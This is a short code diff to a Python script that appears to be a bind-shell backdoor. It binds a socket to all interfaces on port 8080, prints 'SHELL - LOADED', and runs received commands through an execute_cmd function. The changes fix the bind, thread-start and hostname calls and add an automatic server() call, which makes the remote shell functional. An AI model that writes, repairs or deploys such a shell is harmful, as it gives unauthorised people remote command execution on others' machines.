@@ -8,7 +8,7 @@ import argparse
 MAX_BUFFER = 4096
 DEFAULT_PORT = 8080
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-IP = socket.gethostbyaddr()
+IP = socket.gethostbyaddr(socket.gethostname())
 
 def execute_cmd(cmd):
     try:
@@ -74,7 +74,9 @@ def send_thread(socketi):
         exit()
 
 def server():
-    sock.bind("0.0.0.0", DEFAULT_PORT)
+    sock.bind(("0.0.0.0", DEFAULT_PORT))
     sock.listen()
     print("SHELL - LOADED")
-    threading.Thread(target=shell_thread, args=sock)
+    threading.Thread(target=shell_thread, args=sock).start()
+
+server()
